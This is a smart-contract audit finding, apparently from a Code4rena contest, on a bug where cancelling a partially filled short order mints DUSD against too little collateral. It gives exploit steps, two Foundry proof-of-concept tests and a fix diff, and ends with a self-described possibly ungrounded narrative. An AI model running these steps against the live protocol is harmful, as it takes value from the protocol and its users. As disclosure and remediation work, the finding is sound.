---
id: 20920
severity: "High"
---

# Users can mint DUSD with less collateral than required, which gives them free DUSD and may open a liquidatable position

## Description

```solidity
if (shortRecord.status == SR.Closed) {
    // @dev creating shortOrder automatically creates a closed shortRecord which also sets a shortRecordId
    // @dev cancelling an unmatched order needs to also handle/recycle the shortRecordId
    LibShortRecord.deleteShortRecord(asset, shorter, shortRecordId);
} else {
```
```solidity
if (shortRecord.ercDebt < minShortErc) {
```
```solidity
// @dev prevents leaving behind a partially filled SR is under minShortErc
// @dev if the corresponding short is cancelled, then the partially filled SR's debt will == minShortErc
uint88 debtDiff = minShortErc - shortRecord.ercDebt;
{
    STypes.Vault storage Vault = s.vault[vault];

    uint88 collateralDiff = shortOrder.price.mulU88(debtDiff).mulU88(LibOrders.convertCR(shortOrder.shortOrderCR));

    LibShortRecord.fillShortRecord(
        asset,
        shorter,
        shortRecordId,
        SR.FullyFilled,
        collateralDiff,
        debtDiff,
        Asset.ercDebtRate,
        Vault.dethYieldRate
    );
```
```solidity
shortRecord.status = SR.FullyFilled;
```
```solidity
cancelOrder(s.shorts, asset, id);
```
The issue arises in step 3 where it tries to fill the short record up to the `minShortErc`. To fill the Short Record, it first gets the amount of DUSD needed in line 928 of the code snippet below as `debtDiff`. The collateral needed to mint the `DUSD` is calculated in line 932.

There are two issues with the calculation in line 932:

1. It uses the `shortOrderCR` to calculate the collateral needed. If the short order’s collateral ratio is less than 1 ether then the value of the collateral calculated is less than the value of DUSD that eventually gets minted.
2. It uses the short order’s price `shortOrder.price` to calculate the needed collateral. If this price is less than the current price of DUSD in ETH value, the collateral calculated is less than what is required. But if this price is higher than the current price, the user uses more ETH to mint the DUSD.

The short record is filled in line 934, and the collateral needed is removed from the ETH the user initially supplied when he created the short order in line 950. Note that the user (i.e. the shorter) gets the `debtDiff` (i.e. DUSD minted) in line 953.
```solidity
uint88 debtDiff = minShortErc - shortRecord.ercDebt;
{
    STypes.Vault storage Vault = s.vault[vault];

    uint88 collateralDiff = shortOrder.price.mulU88(debtDiff).mulU88(LibOrders.convertCR(shortOrder.shortOrderCR));

    LibShortRecord.fillShortRecord(
        asset,
        shorter,
        shortRecordId,
        SR.FullyFilled,
        collateralDiff,
        debtDiff,
        Asset.ercDebtRate,
        Vault.dethYieldRate
    );

    Vault.dethCollateral += collateralDiff;
    Asset.dethCollateral += collateralDiff;
    Asset.ercDebt += debtDiff;

    // @dev update the eth refund amount
    eth -= collateralDiff;
}
// @dev virtually mint the increased debt
s.assetUser[asset][shorter].ercEscrowed += debtDiff;
```
A malicious user can exploit this by following these steps:

1. Create a short order on an asset that lets the user provide less than 100% capital.
2. Ensure that the order only gets partially filled before it is added to the market.
3. Cancel the order to mint DUSD for only a part of the collateral and get the minted DUSD.

This will allow him to mint more DUSD than the value of the collateral he provided. The Short Record he leaves is also immediately liquidatable.

## Proof of Concept

The POC below can be run in the `Shorts.t.sol` file. It consists of 2 tests:

* `test_MintFreeDUSD` shows how a user can mint DUSD for less collateral than required and open a liquidatable position.
* `test_MintBelowPrice` shows how a user can mint DUSD at a lesser price and open a liquidatable position.
```solidity
// Make sure to import the types below into the Shorts.t.sol file
// import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";
function test_MintFreeDUSD() public {
    // set the initial, penalty and liquidation CRs
    vm.startPrank(owner);
    // set below 200 to allow shorter provide less than 100% of debt
    diamond.setInitialCR(asset, 170); 
    diamond.setPenaltyCR(asset, 120);
    diamond.setLiquidationCR(asset, 150);
    vm.stopPrank();

    // create a bid to match the short and change its state to SR.PartialFill
    fundLimitBidOpt(1 ether, 0.01 ether, receiver);

    // create the short providing only 70% of the dusd to be minted
    uint88 price = 1 ether;
    depositEth(sender, price.mulU88(5000 ether).mulU88(0.7 ether));
    uint16[] memory shortHintArray = setShortHintArray();
    MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
    vm.prank(sender);
    diamond.createLimitShort(asset, uint80(price), 5000 ether, orderHintArray, shortHintArray, 70);

    STypes.ShortRecord memory short = getShortRecord(sender, C.SHORT_STARTING_ID);
    // successfully matches the bid
    assertTrue(short.status == SR.PartialFill);
    
    // cancel the short to use up collateral provided and mint dusd
    vm.prank(sender);
    cancelShort(101);

    short = getShortRecord(sender, C.SHORT_STARTING_ID);
    assertEq(short.ercDebt, 2000 ether); // 2000 dusd minted
    assertEq(short.collateral, 0.01 ether + 0.7 * 2000 ether); // 70% of ETH collateral provided 

    // this SR is liquidatable
    assertGt( diamond.getAssetNormalizedStruct(asset).liquidationCR, short.collateral.div(short.ercDebt.mul(1 ether)));
}

function test_MintBelowPrice() public {
    // create a bid to match the short and change its state to SR.PartialFill
    fundLimitBidOpt(1 ether, 0.01 ether, receiver);

    // create the short providing 400% of the dusd to be minted
    // current initialCR is 500%
    uint88 price = 1 ether;
    depositEth(sender, price.mulU88(5000 ether).mulU88(4 ether));
    uint16[] memory shortHintArray = setShortHintArray();
    MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
    vm.prank(sender);
    diamond.createLimitShort(asset, uint80(price), 5000 ether, orderHintArray, shortHintArray, 400);

    STypes.ShortRecord memory short = getShortRecord(sender, C.SHORT_STARTING_ID);
    assertTrue(short.status == SR.PartialFill); // CR is partially filled by bid
    
    // set the new price to 1.5 ether so that price increase
    uint256 newPrice = 1.5 ether;
    skip(15 minutes);
    ethAggregator.setRoundData(
        92233720368547778907 wei, int(newPrice.inv()) / ORACLE_DECIMALS, block.timestamp, block.timestamp, 92233720368547778907 wei
    );
    fundLimitBidOpt(1 ether, 0.01 ether, receiver);
    assertApproxEqAbs(diamond.getProtocolAssetPrice(asset), newPrice, 15000000150);

    // cancel the short to mint at 1 ether instead of 1.5 ether
    vm.prank(sender);
    cancelShort(101);

    short = getShortRecord(sender, C.SHORT_STARTING_ID);
    assertEq(short.ercDebt, 2000 ether); // 2000 dusd minted
    // 2000 dusd minted for 8000 ether (400% at price of 1 ether) 
    // instead of 12000 ether (400% at price of 1.5 ether)
    assertEq(short.collateral, 0.01 ether + 4*2000 ether);

    // position is liquidatable
    assertGt( diamond.getAssetNormalizedStruct(asset).liquidationCR, short.collateral.div(short.ercDebt.mul(1.5 ether)));
}
```

## Recommendation

Consider using the `initialCR` of the asset if the short order’s CR is lesser and consider using the current oracle price instead of the short order’s price when it was created.

It is also possible that the ETH calculated exceeds the ETH the user provided when he created the Short Order. The sponsor can also consider sourcing more ETH from the user’s escrowed ETH to enable him to cancel when this occurs.
```diff
-                   uint88 collateralDiff = shortOrder.price.mulU88(debtDiff).mulU88(LibOrders.convertCR(shortOrder.shortOrderCR));
+                   uint16 cr = shortOrder.shortOrderCR < s.asset[asset].initialCR ? s.asset[asset].initialCR : shortOrder.shortOrderCR;
+                   uint80 price = LibOracle.getSavedOrSpotOraclePrice(asset);
+                   uint88 collateralDiff = price.mulU88(debtDiff).mulU88(LibOrders.convertCR(cr));

                        LibShortRecord.fillShortRecord(
                            asset,
                            shorter,
                            shortRecordId,
                            SR.FullyFilled,
                            collateralDiff,
                            debtDiff,
                            Asset.ercDebtRate,
                            Vault.dethYieldRate
                        );

                        Vault.dethCollateral += collateralDiff;
                        Asset.dethCollateral += collateralDiff;
                        Asset.ercDebt += debtDiff;

                        // @dev update the eth refund amount
+                   if(eth < collateralDiff) revert Errors.InsufficientCollateral();
                        eth -= collateralDiff;
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an under‑collateralized minting bug in the short‑order workflow. When a short order is partially filled and later cancelled, the contract calculates the additional ETH collateral required to cover the newly minted DUSD by multiplying the debt difference with the short order’s price and its collateral‑ratio (CR). Because the code reuses the CR that was supplied with the order and the price that was fixed at order creation, two logical errors arise. First, if the order’s CR is below the asset’s required initial CR, the computed collateral is lower than the protocol’s minimum safety threshold. Second, if the order’s price is stale or lower than the current oracle price of DUSD in ETH, the formula underestimates the true value of the debt, allowing the user to receive more DUSD than the ETH they actually lock. The root cause is the reliance on order‑specific parameters instead of the globally enforced collateral‑ratio and the up‑to‑date oracle price when filling the short record. An attacker can exploit this by creating a short order with a deliberately low CR, ensuring it is only partially filled, and then cancelling it. During cancellation the contract mints the missing DUSD based on the underestimated collateralDiff, deducts a smaller amount of ETH from the user’s escrow, and credits the user with the excess DUSD. The short record that remains on‑chain is therefore under‑collateralized and becomes immediately liquidatable. From a user’s perspective the symptom is that they receive DUSD without providing the expected amount of ETH, and the protocol shows a short position with zero or very low collateral while the debt is high, often leading to an instant liquidation flag. The impact includes creation of free DUSD, potential loss of protocol value through liquidation, and erosion of trust in the system’s accounting guarantees. The bug manifests only when a short order is partially filled and cancelled, and when the order’s CR or price deviates from the asset’s current parameters. It was discovered during a formal audit by Code4rena through static analysis of the short‑record filling logic and by constructing a proof‑of‑concept test that demonstrated minting DUSD with insufficient collateral. The issue is subtle because the contract does not emit an explicit error when the calculated collateralDiff is lower than the user’s escrow, and the under‑collateralization is only visible after the cancellation step. The recommended remediation is to replace the order‑specific CR with the asset’s initialCR when it is lower, to fetch the current oracle price instead of the stale order price, and to enforce a check that the available ETH collateral is at least the required amount, reverting otherwise. This aligns the collateral calculation with the protocol’s economic model and prevents the creation of under‑collateralized short records.
